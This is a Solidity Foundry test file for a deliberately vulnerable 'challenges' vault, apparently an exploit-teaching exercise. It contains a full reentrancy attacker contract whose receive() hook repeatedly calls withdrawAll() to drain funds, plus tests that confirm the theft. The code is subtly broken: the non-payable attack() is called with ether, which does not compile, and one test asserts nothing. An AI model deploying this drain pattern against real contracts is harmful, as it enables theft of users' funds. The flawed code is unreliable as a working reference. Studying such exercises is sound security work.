// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/challenges/ReentrancyVault.sol";

contract ReentrancyAttacker {
    ReentrancyVault public vault;
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = 5;

    constructor(address _vault) {
        vault = ReentrancyVault(_vault);
    }

    function attack() external {
        vault.deposit{value: 1 ether}();
        vault.withdrawAll();
    }

    receive() external payable {
        if (attackCount < MAX_ATTACKS && address(vault).balance >= 1 ether) {
            attackCount++;
            vault.withdrawAll();
        }
    }
}

contract ReentrancyVaultTest is Test {
    ReentrancyVault public vault;
    
    address public victim = address(1);
    address public attacker = address(2);

    function setUp() public {
        vault = new ReentrancyVault();
        
        // Fund victim and vault
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 2 ether);
        vm.deal(address(vault), 10 ether);
    }

    function testDeposit() public {
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
        
        assertEq(vault.balances(victim), 5 ether);
        assertEq(vault.totalValueLocked(), 15 ether); // 10 initial + 5 deposited
    }

    function testWithdrawAll() public {
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
        
        uint256 initialBalance = victim.balance;
        
        vm.prank(victim);
        vault.withdrawAll();
        
        assertEq(victim.balance - initialBalance, 5 ether);
        assertEq(vault.balances(victim), 0);
    }

    function testReentrancyExploit() public {
        // Setup: Victim deposits funds
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
        
        // Deploy attacker contract
        ReentrancyAttacker exploiter = new ReentrancyAttacker(address(vault));
        
        uint256 vaultBalanceBefore = address(vault).balance;
        uint256 attackerBalanceBefore = address(exploiter).balance;
        
        // Execute reentrancy attack
        vm.prank(attacker);
        exploiter.attack{value: 1 ether}();
        
        uint256 vaultBalanceAfter = address(vault).balance;
        uint256 attackerBalanceAfter = address(exploiter).balance;
        
        // Attacker should have extracted more than deposited due to reentrancy
        assertGt(attackerBalanceAfter - attackerBalanceBefore, 1 ether);
        assertLt(vaultBalanceAfter, vaultBalanceBefore);
    }

    function testNoBalanceWithdrawal() public {
        vm.prank(victim);
        vm.expectRevert("No balance");
        vault.withdrawAll();
    }

    function testReceive() public {
        uint256 initialTVL = vault.totalValueLocked();
        
        vm.prank(victim);
        (bool success, ) = address(vault).call{value: 3 ether}("");
        require(success, "Transfer failed");
        
        assertEq(vault.totalValueLocked(), initialTVL + 3 ether);
    }

    function testGetValueExtracted() public {
        // Setup: Victim deposits funds
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
        
        // Deploy and execute attacker
        ReentrancyAttacker exploiter = new ReentrancyAttacker(address(vault));
        
        vm.prank(attacker);
        exploiter.attack{value: 1 ether}();
        
        // Check extracted amount is tracked
        // Note: In actual implementation this would need to be recorded properly
    }
}
